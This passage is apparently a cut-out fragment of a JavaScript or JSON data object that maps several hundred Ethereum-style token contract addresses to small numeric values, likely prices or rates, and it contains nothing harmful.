                "0xf6158bdfe9e013673269b4d1ca468e8efd77ca3f": 33463e-10,
                "0xa4be4cdc552891a6702e1ae9645ef445179a4463": 404369e-9,
                "0xbb97e381f1d1e94ffa2a5844f6875e6146981009": 52057e-10,
                "0x823556202e86763853b40e9cde725f412e294689": 340883e-10,
                "0x51cb253744189f11241becb29bedd3f1b5384fdb": 46147e-10,
                "0xe1005bfbbc9a17d5d844c7a4371cbf6b2b387380": 544666e-10,
                "0x04a6b6de116fb8bf57e5ee8b05e0293ea3639fe8": 1.53e-8,
                "0xcbfef8fdd706cde6f208460f2bf39aa9c785f05d": 456889e-10,
                "0xbede1f59fa4412556fef69f1b9969f2003e3f8c1": 1e-10,
                "0xab167e816e4d76089119900e941befdfa37d6b32": 0,
                "0x634239cfa331df0291653139d1a6083b9cf705e3": 37068e-10,
                "0xb06b8186cc008a79fd6722b1eefad07c14e97da0": 205251e-10,
                "0x721a1b990699ee9d90b6327faad0a3e840ae8335": .0004131248,
                "0xaa8330fb2b4d5d07abfe7a72262752a8505c6b37": 21441e-9,
                "0x4c601dc69affb0d4fc8de1ac303705e432a4a27e": 464108e-10,
                "0xf6650117017ffd48b725b4ec5a00b414097108a7": .0012641497,
                "0x809e130e10e787139c54e1d12d3d1971b7a675bf": .0002740725,
                "0x20d4db1946859e2adb0e5acc2eac58047ad41395": 45553e-10,
                "0x9b00e6e8d787b13756eb919786c9745054db64f9": .0004032322,
                "0xfd25676fc2c4421778b18ec7ab86e7c5701df187": 158461e-10,
                "0x38d9eb07a7b8df7d86f440a4a5c4a4c1a27e1a08": .0002587072,
                "0xba3e5f8b4200a5eb856ff2c3e001ab29444491aa": .0004530859,
                "0x8e964e35a76103af4c7d7318e1b1a82c682ae296": .0012471461,
                "0x74b1af114274335598da72f5c6ed7b954a016eed": 924397e-10,
                "0xc91b523a59acc63a64f61fc7bbfb4bfc82dd25f2": 6.187e-7,
                "0xe831f96a7a1dce1aa2eb760b1e296c6a74caa9d5": 98142e-9,
                "0x64df3aab3b21cc275bb76c4a581cf8b726478ee0": 37247e-10,
                "0x2c537e5624e4af88a7ae4060c022609376c8d0eb": 3537e-8,
                "0xfc98e825a2264d890f9a1e68ed50e1526abccacd": .0014538711,
                "0x1c4853ec0d55e420002c5efabc7ed8e0ba7a4121": 25159e-10,
                "0x805c2077f3ab224d889f9c3992b41b2f4722c787": 66895e-10,
                "0x0954906da0bf32d5479e25f46056d22f08464cab": .0016584421,
                "0x829c97092c0cc92efe7397dd3ddb831cc5835bae": 7.721e-7,
                "0x301c755ba0fca00b1923768fffb3df7f4e63af31": 6.188e-7,
                "0x3ea8ea4237344c9931214796d9417af1a1180770": 2195e-8,
                "0xaa6e8127831c9de45ae56bb1b0d4d4da6e5665bd": .0068165057,
                "0xc5102fe9359fd9a28f877a67e36b0f050d81a3cc": 602673e-10,
                "0xe80c0cd204d654cebe8dd64a4857cab6be8345a3": 4.392e-7,
                "0x69ed89ecd35082e031fe52b75123f801db083306": 2.285e-7,
                "0x68e9c0d9aa450254aed2cd102503d4dff6b3c37c": 217601e-10,
                "0xddac9c604ba6bc4acec0fbb485b83f390ecf2f31": 0,
                "0xb620be8a1949aa9532e6a3510132864ef9bc3f82": 6.605e-7,
                "0xd23367155b55d67492dfdc0fc7f8bb1df7114fd9": .0381918178,
                "0x374fb05c96c36348b92e38fb088b26b8511e3b3d": 2.071e-7,
                "0xf51ccb15d3f2d304ae6c409303e8b3a3e397a80b": 334029e-10,
                "0xe67f943af5eb6051ef56f05979cc30b732717fa6": 786111e-10,
                "0x4e4a47cac6a28a62dcc20990ed2cda9bc659469f": 0,
                "0x5e3346444010135322268a4630d2ed5f8d09446c": 557094e-9,
                "0x4b1d0b9f081468d780ca1d5d79132b64301085d1": 75033e-10,
                "0x49e833337ece7afe375e44f4e3e8481029218e5c": .0001444046,
                "0xc2544a32872a91f4a553b404c6950e89de901fdb": .0008675219,
                "0xd2877702675e6ceb975b4a1dff9fb7baf4c91ea9": 1.576e-7,
                "0xf4f618eff5ef36cde2fca4fbd86554c62fb1382b": 6.196e-7,
                "0x16cc8367055ae7e9157dbcb9d86fd6ce82522b31": 18046e-9,
                "0xbc7250c8c3eca1dfc1728620af835fca489bfdf3": 4.1e-9,
                "0x36919a60a2b67b6d2329863093d180d23d5a0308": 0,
                "0x2c4f1df9c7de0c59778936c9b145ff56813f3295": 380791e-10,
                "0x3a0b022f32b3191d44e5847da12dc0b63fb07c91": 6.224e-7,
                "0xf8b358b3397a8ea5464f8cc753645d42e14b79ea": 43282e-10,
                "0x968cbe62c830a0ccf4381614662398505657a2a9": .0002450703,
                "0xbc19712feb3a26080ebf6f2f7849b417fdd792ca": 33324e-10,
                "0x0b452278223d3954f4ac050949d7998e373e7e43": 1.8e-9,
                "0x1f6bd8766f8a8aa58f7441c8dd3709afa3a56202": 31733e-10,
                "0xcaabcaa4ca42e1d86de1a201c818639def0ba7a7": 144553e-9,
                "0x6b37374fe7980ae33fc87b0d66a490ec6903e87a": .0006682027,
                "0x6a4c76874e686a7d080d173987a35a9c48905583": .0005858232,
                "0xd7c302fc3ac829c7e896a32c4bd126f3e8bd0a1f": 74073e-10,
                "0xc18c07a18198a6340cf4d94855fe5eb6dd33b46e": 227643e-10,
                "0x4b0f027d0b694aae2761ed2d426295d4f949f5d0": 21344e-10,
                "0x4b13006980acb09645131b91d259eaa111eaf5ba": 307309e-10,
                "0x8355dbe8b0e275abad27eb843f3eaf3fc855e525": 454885e-10,
                "0x083d41d6dd21ee938f0c055ca4fb12268df0efac": 895848e-10,
                "0x95b3497bbcccc46a8f45f5cf54b0878b39f8d96c": .0012137086,
                "0x12b54baa8ffcfd6679ccf1ae618ca3006cfcc2ac": 449257e-10,
                "0x06874f973dc3c96dc22a10ef0d0609f877f335ea": 958235e-10,
                "0x4fc15c91a9c4a9efb404174464687e8e128730c2": .0001791106,
                "0x66f73d0fd4161cfad4302dc145ff994375c13475": 135219e-10,
                "0x3106a0a076bedae847652f42ef07fd58589e001f": 987064e-10,
                "0xd373576a9e738f37dc6882328358ff69c4caf4c6": 24579e-10,
                "0x382a1667c9062f0621362f49076ef6e4fe4c9ec7": 29438e-10,
                "0x7f280dac515121dcda3eac69eb4c13a52392cace": 101419e-10,
                "0x095797fd4297fb79883cc912a5ba6313b15c445d": .029319853,
                "0xb19189fb36c816f3e0f16065057b07b790998fdc": 20528e-10,
                "0x94e9eb8b5ab9fd6b9ea3169d55ffade62a01702e": 634531e-10,
                "0x6393e822874728f8afa7e1c9944e417d37ca5878": 244955e-10,
                "0xbd3de9a069648c84d27d74d701c9fa3253098b15": 80905e-10,
                "0x94e0bab2f6ab1f19f4750e42d7349f2740513ad5": .0043610409,
                "0xadc3f2c3d728202658930860158c726d8180a38f": 116677e-10,
                "0xd996035db82cae33ba1f16fdf23b816e5e9faabb": 4.221e-7,
                "0xbbab3bdb291b0f22bc9881895ff488a5db67bec8": 572643e-10,
                "0x00c2999c8b2adf4abc835cc63209533973718eb1": 1e-10,
                "0x8e83a9ebc6954cc8182d9b9abc711c601905ac2d": 177926e-10,
                "0x4f640f2529ee0cf119a2881485845fa8e61a782a": 77327e-10,
                "0x19e98c4921aab7e3f5fd2adca36cfb669c63e926": 663066e-10,
                "0x383518188c0c6d7730d91b2c03a03c837814a899": .0375592309,
                "0x5f944b0c4315cb7c3a846b025ab4045da44abf6c": 3e-10,
                "0x6adb2e268de2aa1abf6578e4a8119b960e02928f": 0,
                "0xd69f306549e9d96f183b1aeca30b8f4353c2ecc3": .0002427802,
                "0xbc6e06778708177a18210181b073da747c88490a": 78339e-10,
                "0x777e2ae845272a2f540ebf6a3d03734a5a8f618e": 0,
                "0x12e951934246186f50146235d541d3bd1d463e4d": .0003151633,
                "0x88aa4a6c5050b9a1b2aa7e34d0582025ca6ab745": .0003120528,
                "0x88acdd2a6425c3faae4bc9650fd7e27e0bebb7ab": .001505387,
                "0xe14e06671702f0db50055388c29adc66821d933b": .0001339451,
                "0x6d52dfefb16bb9cdc78bfca09061e44574886626": 303728e-10,
                "0xb8d313068891137952e7dff19d8afaa64dbc6fcb": 15262e-10,
                "0x4bcea5e4d0f6ed53cf45e7a28febb2d3621d7438": 298655e-10,
                "0xd38bb40815d2b0c2d2c866e0c72c5728ffc76dd9": 714947e-10,
                "0x3e6f1be54feb9cc37dbfc31a894a8810357c3f9c": .0002845527,
                "0x668dbf100635f593a3847c0bdaf21f0a09380188": 19514e-10,
                "0xfc4913214444af5c715cc9f7b52655e788a569ed": .0009487522,
                "0xb840d10d840ef47c233fec1fd040f5b145a6dfa5": 48729e-10,
                "0x19ac2659599fd01c853de846919544276ad26f50": .0017202402,
                "0x0c9b3ab1bd0cf0745625381f5c3aa1cd9bbc7abb": .0003113735,
                "0xe65d37f18a770643cb14c8611aca7a67244ba480": .0006089392,
                "0xb668473944d2e25b6af6d46917eb0233dbac53ae": .0035493131,
                "0x0c572544a4ee47904d54aaa6a970af96b6f00e1b": 178808e-10,
                "0x232fb065d9d24c34708eedbf03724f2e95abe768": .0106173468,
                "0x940bdcb99a0ee5fb008a606778ae87ed9789f257": .0003195767,
                "0xa41f142b6eb2b164f8164cae0716892ce02f311f": 553301e-10,
                "0xb269ab3b20e09e6fd17c3ed5b4cecf3dea1a5141": 126745e-10,
                "0xd43be54c1aedf7ee4099104f2dae4ea88b18a249": 902856e-10,
                "0xfb1172b050bcc798e37ae8abf620cc528e771162": .0003757918,
                "0x464fdb8affc9bac185a7393fd4298137866dcfb8": 86421e-10,
                "0x7bec98609cb6378d6f995e8f8097ee78376fbec9": .0002080877,
                "0x1d6405138a335ce5fd7364086334efb3e4f28b59": .0001041275,
                "0xa75e7928d3de682e3f44da60c26f33117c4e6c5c": 82266e-10,
                "0x3a4cab3dcfab144fe7eb2b5a3e288cc03dc07659": 50271e-10,
                "0x16cda4028e9e872a38acb903176719299beaed87": 655e-9,
                "0x5cb3ce6d081fb00d5f6677d196f2d70010ea3f4a": 33012e-10,
                "0x535bc155a84182e9948c87e46e1e38967693828b": 2.454e-7,
                "0xbd100d061e120b2c67a24453cf6368e63f1be056": 19413e-10,
                "0x356a5160f2b34bc8d88fb084745465ebbbed0174": .0010957009,
                "0x31429d1856ad1377a8a0079410b297e1a9e214c2": 184572e-10,
                "0x79a06acb8bdd138beeecce0f1605971f3ac7c09b": 6.583e-7,
                "0xc3dca8f61b275d1e88f3ea31b3e311c49f56b24b": 43337e-10,
                "0x9fae2529863bd691b4a7171bdfcf33c7ebb10a65 (callisto network)": 129885e-10,
                "0x76c5449f4950f6338a393f53cda8b53b0cd3ca3a": .0001176634,
                "0x8ee325ae3e54e83956ef2d5952d3c8bc1fa6ec27": 267997e-10,
                "0x8752bf7ad53d25a4165b9370f2becc22dd8ae838": .0004013021,
                "0x0407b4c4eaed35ce3c5b852bdfa1640b09eeedf4": 25999e-9,
                "0x005d1123878fc55fbd56b54c73963b234a64af3c": 4.4e-9,
                "0x4550003152f12014558e5ce025707e4dd841100f": 25041e-9,
                "0xdd2a36ae937bc134ea694d77fc7e2e36f5d86de0": 84935e-10,
                "0x333a4823466879eef910a04d473505da62142069": .4923967676,
                "0x18b52f500e6d9c8b0455ec3483846d9f8edd7e1b": 2e-9,
                "0x173e552bf97bbd50b455514ac52991ef639ba703": 5.26e-8,
                "0x99fe3b1391503a1bc1788051347a1324bff41452": .0001667858,
                "0x6e98e5401adcb0d76f4debfc3d794b3031f48790": 798528e-9,
                "0xd779eea9936b4e323cddff2529eb6f13d0a4d66e": 157471e-10,
                "0x4daeb4a06f70f4b1a5c329115731fe4b89c0b227": 8.507e-7,
                "0xc67b12049c2d0cf6e476bc64c7f82fc6c63cffc5": 552669e-10,
                "0xd85ad783cc94bd04196a13dc042a3054a9b52210": 72027e-10,
                "0x7cfea0dd176651e7b5a1ced9c4faf8ee295315fd": .0005043872,
                "0x7b32e70e8d73ac87c1b342e063528b2930b15ceb": 0,
                "0xf03a7eb46d01d9ecaa104558c732cf82f6b6b645": .0006276861,
                "0xb8fa12f8409da31a4fc43d15c4c78c33d8213b9b": 76873e-10,
                "0x38b0e3a59183814957d83df2a97492aed1f003e2": 3.449e-7,
                "0x0c3ef32f802967db75b9d49fe1e76620151ccb81": 2.03e-8,
                "0x508df5aa4746be37b5b6a69684dfd8bdc322219d": 12511e-10,
                "0x80d4f13acc30968fd6225b1ea79f5779f09fee60": 2.91e-8,
                "0x350ca33e2c75269a220c75d337e9b9ab177fa269": 4.6e-9,
                "0x8fac8031e079f409135766c7d5de29cf22ef897c": 33442e-10,
                "0xfb782396c9b20e564a64896181c7ac8d8979d5f4": 94166e-10,
                "0x72dd4b6bd852a3aa172be4d6c5a6dbec588cf131": 211491e-10,
                "0xd38de88687172bde440755b5237987e4a87c23a7": 165088e-10,
                "0xdc349913d53b446485e98b76800b6254f43df695": 0,
                "0x40803cea2b2a32bda1be61d3604af6a814e70976": .0001482007,
                "0xab37e1358b639fd877f015027bb62d3ddaa7557e": .0004635137,
                "0x6347978f54f75d76630b819897f9ce68c83ce2a2": 443882e-10,
                "0x7237c0b30b1355f1b76355582f182f6f04b08740": 41873e-10,
                "0xde5ed76e7c05ec5e4572cfc88d1acea165109e44": .0266473857,
                "0xbe393aa534f82c0ffac31bf06a23e283acb3352b": 713194e-10,
                "0x01ba67aac7f75f647d94220cc98fb30fcc5105bf": 926207e-10,
                "0x78132543d8e20d2417d8a07d9ae199d458a0d581": 0,
                "0xd7f0cc50ad69408ae58be033f4f85d2367c2e468": 7696e-9,
                "0xcc1f757e3fa67b70e761c71f4b75b1e9f72263af": 150513e-10,
                "0xd049206fb408a611e543791f2d8f102a8bc253dc": 0,
                "0x68037790a0229e9ce6eaa8a99ea92964106c4703": .0006669109,
                "0xc4de189abf94c57f396bd4c52ab13b954febefd8": 775135e-10,
                "0x14a32f050facf226ec60882398a9bf36d91dbac2": 19207e-9,
                "0x69570f3e84f51ea70b7b68055c8d667e77735a25": 20856e-10,
                "0x2b867efd2de4ad2b583ca0cb3df9c4040ef4d329": 1.483e-7,
                "0xe803178b48a0e560c2b19f3b3d4e504f79d229ce": 262705e-9,
                "0x39ae6d231d831756079ec23589d2d37a739f2e89": 600992e-10,
                "0x426fc8be95573230f6e6bc4af91873f0c67b21b4": 7e-10,
                "0x84f20bf5bb4be345d3ab37c565f732753435dbe3": .0150666624,
                "0x73d7c860998ca3c01ce8c808f5577d94d545d1b4": 250329e-10,
                "0x6149c26cd2f7b5ccdb32029af817123f6e37df5b": 743469e-10,
                "0x1d2d542e6d9d85a712deb4d1a7d96a16ce00b8ce": 1.7e-9,
                "0xa5e412ba6fca1e07b15defcaa4236ff7b5a7f086": 20408e-10,
                "0x7a5d3a9dcd33cb8d527f7b5f96eb4fef43d55636": 9.471e-7,
                "0xa82e4aa4c8d0859b1dd333145b6dd488f23e9782": .0001031424,
                "0x8c76155f890e268882c8fd91d3350332b18d3a0b": 220019e-10,
                "0xb1f233835de2440620332267ba729bfe74fa2cfd": 2e-9,
                "0xe76c6c83af64e4c60245d8c7de953df673a7a33d": .0002648837,
                "0x8c6bf16c273636523c29db7db04396143770f6a0": 6.8e-9,
                "0xe0ad1806fd3e7edf6ff52fdb822432e847411033": 475651e-10,
                "0xc691bc298a304d591ad9b352c7a8d216de9f2ced": 106775e-10,
                "0x9ee91f9f426fa633d227f7a9b000e28b9dfd8599": .0006330606,
                "0x549044000a94870ab7c5017cd8fb0aefa9239a13": .0001223508,
                "0x3b1a3c5d9d5c60651d4841c7814aa0fbb45a863d": 4.541e-7,
                "0x89509aa1d14a8e1e5364ec4c3b041213bcdbe08d": .0012473753,
                "0x2a2550e0a75acec6d811ae3930732f7f3ad67588": 91798e-10,
                "0x8167d3b1024cb51a2dd1b4d889ddf7023420796a": .0002677543,
                "0xcb3c5438dae9fe30b18ea53da3dab0e7dcaa0e4b": 616e-9,
                "0x0f628641d0ea1ecab9341e58d4982c0018a51c6b": 138114e-10,
                "0x48c276e8d03813224bb1e55f953adb6d02fd3e02": 0,
                "0xeb837ece90fd2d85ddd3ed129481c7333419f38b": 74513e-10,
                "0xc4c2614e694cf534d407ee49f8e44d125e4681c4": 103181e-10,
                "0x9798df2f5d213a872c787bd03b2b91f54d0d04a1": 34304e-10,
                "0x2559813bbb508c4c79e9ccce4703bcb1f149edd7": 326683e-10,
                "0x3b604747ad1720c01ded0455728b62c0d2f100f0": 2.4e-9,
                "0xbf0741e995f469d39e4f96c0780f9a8e43f4b978": 557025e-10,
                "0xa888d9616c2222788fa19f05f77221a290eef704": 5.009e-7,
                "0x2a03a891add2dc6d0f7b94419086630ba5cb65b6": 29243e-10,
                "0x1cc30e2eac975416060ec6fe682041408420d414": 17998e-10,
                "0xb26c4b3ca601136daf98593feaeff9e0ca702a8d": 373606e-10,
                "0x37c997b35c619c21323f3518b9357914e8b99525": .0004646001,
                "0xa2a54f1ec1f09316ef12c1770d32ed8f21b1fb6a": 280985e-10,
                "0x51fe2e572e97bfeb1d719809d743ec2675924edc": 239577e-10,
                "0xf0dc76c22139ab22618ddfb498be1283254612b1": 3.1080719283,
                "0xde075d9adbd0240b4462f124af926452ad0bac91": .00221841,
                "0x66d28cb58487a7609877550e1a34691810a6b9fc": 343248e-9,
                "0x667102bd3413bfeaa3dffb48fa8288819e480a88": .0117933105,
                "0x22b48e1f20043d1db5f2a11cbf1d520a4f20b198": .0179215809,
                "0x0ab87046fbb341d058f17cbc4c1133f25a20a52f": 1.7220111531,
                "0x08ba718f288c3b12b01146816bef9fa03cc635bc": 9.133e-7,
                "0x2f32b39023da7d6a6486a85d12b346eb9c2a0d19": 376344e-10,
                "0x7db02aa39a3d0271e4c61c04d03857a10fc922c5": 534e-9,
                "0x4e0fca55a6c3a94720ded91153a27f60e26b9aa8": 40316e-10,
                "0x7e03521b9da891ca3f79a8728e2eaeb24886c5f9": 2.956e-7,
                "0x59d1e836f7b7210a978b25a855085cc46fd090b5": 4.25e-8,
                "0xdc0327d50e6c73db2f8117760592c8bbf1cdcf38": .0013062187,
                "0xe6cc10ef4de1ccfb821c99c04abfe1859d8eab8f": .0003799385,
                "0x8af5fedc0f263841c18f31d9dbcc97a47e1ab462": 3e-9,
                "0xf4dc48d260c93ad6a96c5ce563e70ca578987c74": .0001772156,
                "0x3ecab35b64345bfc472477a653e4a3abe70532d9": .0004960449,
                "0xd1ba9bac957322d6e8c07a160a3a8da11a0d2867": 480339e-10,
                "0xceeb07dd26b36287b6d109f0b06d7e8202ce8c1d": .0006073869,
                "0x9f52c8ecbee10e00d9faaac5ee9ba0ff6550f511": .0001001423,
                "0xeabb8996ea1662cad2f7fb715127852cd3262ae9": 418304e-10,
                "0x61fd1c62551850d0c04c76fce614cbced0094498": 428347e-10,
                "0x446f2a8a39cc730ef378be759a3c57f1a3fe824c": 3739e-9,
                "0x71a28feaee902966dc8d355e7b8aa427d421e7e0": 13e-8,
                "0x7ca4408137eb639570f8e647d9bd7b7e8717514a": 207214e-10,
                "0xa6a1cc527d48585538b137e6abc14b2a55489d11": .0001239443,
                "0x8798249c2e607446efb7ad49ec89dd1865ff4272": .0014876631,
                "0xd6929179d752d5d25c5efe2d9729eb77d7138a80": 69513e-10,
                "0x9ccf191169a613eca433a249d3f40131178caebc": 67439e-10,
                "0x5ec03c1f7fa7ff05ec476d19e34a22eddb48acdc": 250388e-10,
                "0xe83d5fb2c60b3a2597452e248cf7b2f52a7e731e": 178682e-10,
                "0x03042ae6fcfd53e3a0baa1fab5ce70e0cb74e6fb": 1.485384359,
                "0x4e114d405b9ba2f59524941733e505ae03fb1fb5": .0002902873,
                "0xc7c36ee729968944a86e0cd504deccd3b0edbae1": .0001092763,
                "0x83c141ee88c502cb9654de93598e9f16555082a8": 107676e-10,
                "0xbec5938fd565cbec72107ee39cde1bc78049537d": 4.555e-7,
                "0x40eb746dee876ac1e78697b7ca85142d178a1fc8": 25009e-10,
                "0x3c72fca8523686fd9e5740b0826fa4bb376e0241": 529e-9,
                "0xf9c53268e9de692ae1b2ea5216e24e1c3ad7cb1e": 532047e-10,
                "0xa49811140e1d6f653dec28037be0924c811c4538": 252e-9,
                "0x1864ce27e9f7517047933caae530674e8c70b8a7": 2.684e-7,
                "0x6a969d379700b2e5ea4e684d273d63c1c050ba49": 5.331e-7,
                "0x0913ddae242839f8995c0375493f9a1a3bddc977": 73506e-10,
                "0x788b6d2b37aa51d916f2837ae25b05f0e61339d1": .0018895667,
                "0x96610186f3ab8d73ebee1cf950c750f3b1fb79c2": 14918e-10,
                "0x5a75a093747b72a0e14056352751edf03518031d": 13869e-10,
                "0xa52bffad02b1fe3f86a543a4e81962d3b3bb01a7": 28786e-10,
                "0x9e6b19874e97fe8e8cad77f2c0ab5e7a693e5dbf": 76104e-10,
                "0x83249c6794bca5a77eb8c0af9f1a86e055459cea": 2.52e-8,
                "0x936b6659ad0c1b244ba8efe639092acae30dc8d6": 235137e-10,
                "0x1a4f4d457786314668bd5de0e49f89fe6e2a4802": 1.551e-7,
                "0xa8b0f154a688c22142e361707df64277e0a0be66": .0030502691,
                "0x6a6c2ada3ce053561c2fbc3ee211f23d9b8c520a": 9223e-9,
                "0xe529b502fec3ff0ea86fe63da505ec62fdf4f387": 23928e-10,
                "0x5ba19d656b65f1684cfea4af428c23b9f3628f97": 42529e-10,
                "0x8d26cca0d58913932157dd4b294d4c95066172df": .0003900344,
                "0x9b83f827928abdf18cf1f7e67053572b9bceff3a": 49947e-10,
                "0x3fab0bbaa03bceaf7c49e2b12877db0142be65fc": 621604e-10,
                "0x805ea9c07b49dd23ce11ec66dc6d8a2957385035": 10001e-10,
                "0xcacc19c5ca77e06d6578decac80408cc036e0499": 86e-8,
                "0x104f3152d8ebfc3f679392977356962ff36566ac": 505553e-10,
                "0xa3ec7df93090f4de46faea09f73cc40ebe7dd714": 1e-8,
                "0xfeeb4d0f5463b1b04351823c246bdb84c4320cc2": .0016379098,
                "0xbaac2b4491727d78d2b78815144570b9f2fe8899": 6.356e-7,
                "0x47a85fe1ce3ce83d1a9184d42880cc71dfc7a494": 334e-9,
                "0xd35c06a2781f648c75290976ecf71e71582188b7": 45884e-10,
                "0xc7d9c108d4e1dd1484d3e2568d7f74bfd763d356": .0006557941,
                "0xf56842af3b56fd72d17cb103f92d027bba912e89": 141869e-10,
                "0x425c5b7b55f9c981c71935418ed044e79d8080e2": .0041604628,
                "0xd487892bb4c57edbe7ab401d9fe801c8fe6473f5": 3.757e-7,
                "0x7a2bc711e19ba6aff6ce8246c546e8c4b4944dfd": .0546749965,
                "0x6069c9223e8a5da1ec49ac5525d4bb757af72cd8": 719e-8,
                "0xd9063a24630f24cd4dc99a9c7abe73f82fc6b722": 320604e-10,
                "0x6692de64716a177c15360d8d010bc522bbc530a0": 884745e-10,
                "0x25b24b3c47918b7962b3e49c4f468367f73cc0e0": 29e-9,
                "0x6f40d4a6237c257fff2db00fa0510deeecd303eb": .0005330981,
                "0x7ecbb21346c501fd07eb165e406120fa32381c16": 889926e-10,
                "0x8a6d4c8735371ebaf8874fbd518b56edd66024eb": 1692e-9,
                "0x86efc496dca70bcfd92d19194290e8457a375773": 2.71e-8,
                "0x3cbb7f5d7499af626026e96a2f05df806f2200dc": 2526e-9,
                "0x009178997aff09a67d4caccfeb897fb79d036214": 57931e-10,
                "0x35a18000230da775cac24873d00ff85bccded550": 936824e-10,
                "0x83ad87c988ac0c6277c0c6234cc8108b20bb5d9b": 1.075e-7,
                "0x8686525d6627a25c68de82c228448f43c97999f2": 0,
                "0x5c8c8d560048f34e5f7f8ad71f2f81a89dbd273e": 69905e-10,
                "0x6369c3dadfc00054a42ba8b2c09c48131dd4aa38": 120425e-10,
                "0xf0d33beda4d734c72684b5f9abbebf715d0a7935": 98842e-10,
                "0x686f2404e77ab0d9070a46cdfb0b7fecdd2318b0": 685662e-10,
                "0xdef1ca1fb7fbcdc777520aa7f396b4e015f497ab": 603109e-10,
                "0xae78736cd615f374d3085123a210448e74fc6393": 1.0644502767,
                "0x12fd19dac0fab61bed5e0f09091b470c452d4d61": 18e-8,
                "0x60be1e1fe41c1370adaf5d8e66f07cf1c2df2268": .0001797455,
                "0x6bba316c48b49bd1eac44573c5c871ff02958469": 1.4e-9,
                "0x3e362283b86c1b45097cc3fb02213b79cf6211df": 0,
                "0x21d5a14e625d767ce6b7a167491c2d18e0785fda": 1.9836232619,
                "0xfc1cb4920dc1110fd61afab75cf085c1f871b8c6": 337793e-10,
                "0x431d5dff03120afa4bdf332c61a6e1766ef37bdb": 45468e-10,
                "0x5dd57da40e6866c9fcc34f4b6ddc89f1ba740dfe": 94988e-10,
                "0xcbe7142f5c16755d8683ba329efa1abf7b54482d": 15504e-10,
                "0x1a23a6bfbadb59fa563008c0fb7cf96dfcf34ea1": 256439e-10,
                "0xb46eda6219ba121ce9280388e7afb7dc84be3ff2": 38337e-10,
                "0xe1bda0c3bfa2be7f740f0119b6a34f057bd58eba": 15472e-10,
                "0xcd74cf66c43e45abd5703f3642f73d0675d6aff7": .0003548885,
                "0xebe807bfdf8b2092e36e964c75463a8aaa642139": 20588e-9,
                "0xf2354f740f31704820f6fcfba70b9da065459b62": 1.413e-7,
                "0x77f9cf0bd8c500cffdf420e72343893aecc2ec0b": 3e-10,
                "0x39ea10e507720783c27edd5f96bf2d6e199579b8": 352224e-10,
                "0x1c9ba9144505aaba12f4b126fda9807150b88f80": .0004786482,
                "0x6653c0d21507573cc39ead1e609d74d5e0ca16e2": 743809e-10,
                "0x29ceddcf0da3c1d8068a7dfbd0fb06c2e438ff70": 202e-9,
                "0xb1a30851e3f7d841b231b086479608e17198363a": 26213e-10,
                "0x43de1145cd22f0a9cc99e51c205e6e81161df6b9": .0001324241,
                "0x108a850856db3f85d0269a2693d896b394c80325": 61223e-10,
                "0x40897c872214303b6f479a37e549ee1516b264a2": 84141e-10,
                "0x53c8395465a84955c95159814461466053dedede": 718485e-10,
                "0xd81b71cbb89b2800cdb000aa277dc1491dc923c3": 17805e-10,
                "0x3e828ac5c480069d4765654fb4b8733b910b13b2": 344259e-10,
                "0x4ae2cd1f5b8806a973953b76f9ce6d5fab9cdcfd": 2.6e-9,
                "0x4734baf528766ec4c420a6c13f8dba7bb1920181": 3.052e-7,
                "0x8c661806f716652b637728355cc4e2620d428f99": 441506e-10,
                "0x37f74e99794853777a10ea1dc08a64c86958f06a": 6.36e-8,
                "0xa829f97373069ee5d23175e4105df8fd49238be7": 3.57e-8,
                "0x927159670c50042109d7c0f4aed0cee89452433e": 47338e-10,
                "0x5f69b7ab8f7cab199a310fd5a27b43fef44ddcc0": .0004411881,
                "0x88303fed02b31db9c7a9eafb711da9ef4a03e5d3": 22669e-10,
                "0x34d6a0f5c2f5d0082141fe73d93b9dd00ca7ce11": 47008e-10,
                "0x7884f51dc1410387371ce61747cb6264e1daee0b": .0031176634,
                "0xfbbe9b1142c699512545f47937ee6fae0e4b0aa9": .0852290049,
                "0x17d2628d30f8e9e966c9ba831c9b9b01ea8ea75c": .0002021792,
                "0xcda4e840411c00a614ad9205caec807c7458a0e3": 56338e-10,
                "0x428dc22668e6f3468273634067e5545ed5417a3e": 23205e-10,
                "0xc8d07671afba9492da95819de4ad10859e00ab7f": 169348e-10,
                "0xb24cd494fae4c180a89975f1328eab2a7d5d8f11": .0002066358,
                "0xc3ffbe26e9446ac52008ffc8c1191d60a12bdc48": 14803e-9,
                "0x39207d2e2feef178fbda8083914554c59d9f8c00": 0,
                "0xdb5c3c46e28b53a39c255aa39a411dd64e5fed9c": 812728e-10,
                "0xdb298285fe4c5410b05390ca80e8fbe9de1f259b": 205636e-10,
                "0x67954768e721fad0f0f21e33e874497c73ed6a82": 4.873e-7,
                "0x269616d549d7e8eaa82dfb17028d0b212d11232a": 64.0036696313,
                "0xf59257e961883636290411c11ec5ae622d19455e": .0016107587,
                "0xdf09a216fac5adc3e640db418c0b956076509503": 12308e-10,
                "0x60f63b76e2fc1649e57a3489162732a90acf59fe": 7.65e-8,
                "0x2f109021afe75b949429fe30523ee7c0d5b27207": .0001549055,
                "0xdc524e3c6910257744c1f93cf15e9f472b5bd236": .0001513467,
                "0xe6602b34d8510b033e000975b3322537c7172441": 8.608e-7,
                "0xaa0c5b3567fd1bac8a2a11eb16c3f81a49eea90f": 189e-9,
                "0x252b9f56359901a0bde52d0675b1f1130d86f471": 24998e-10,
                "0xd6a5ab46ead26f49b03bbb1f9eb1ad5c1767974a": 25388e-10,
                "0xf88b137cfa667065955abd17525e89edcf4d6426": 36937e-10,
                "0xf34b1db61aca1a371fe97bad2606c9f534fb9d7d": .0002918663,
                "0x6dca182ac5e3f99985bc4ee0f726d6472ab1ec55": 1.114e-7,
                "0x7bd29408f11d2bfc23c34f18275bbf23bb716bc7": 26336e-10,
                "0xaa4e3edb11afa93c41db59842b29de64b72e355b": 230843e-10,
                "0x53fd2342b43ecd24aef1535bc3797f509616ce8c": 37551e-10,
                "0xbcf91e60a6719eb3e9308addf1f7c6185c2af889": .0007964372,
                "0xcc1a8bd438bebc4b2a885a34475bb974f2124317": 130877e-10,
                "0x616ef40d55c0d2c506f4d6873bda8090b79bf8fc": 0,
                "0x77271813bd9167e75b5df9c230cf58d64f0a58fd": 353365e-10,
                "0x0d86eb9f43c57f6ff3bc9e23d8f9d82503f0e84b": 456486e-10,
                "0x20c36f062a31865bed8a5b1e512d9a1a20aa333a": 124878e-10,
                "0x4521c9ad6a3d4230803ab752ed238be11f8b342f": 1e-9,
                "0xe23311294467654e0cab14cd32a169a41be5ca8e": 152001e-10,
                "0x226f7b842e0f0120b7e194d05432b3fd14773a9d": 2.788e-7,
                "0xd6caf5bd23cf057f5fccce295dcc50c01c198707": 4.776e-7,
                "0xa499648fd0e80fd911972bbeb069e4c20e68bf22": .0001296781,
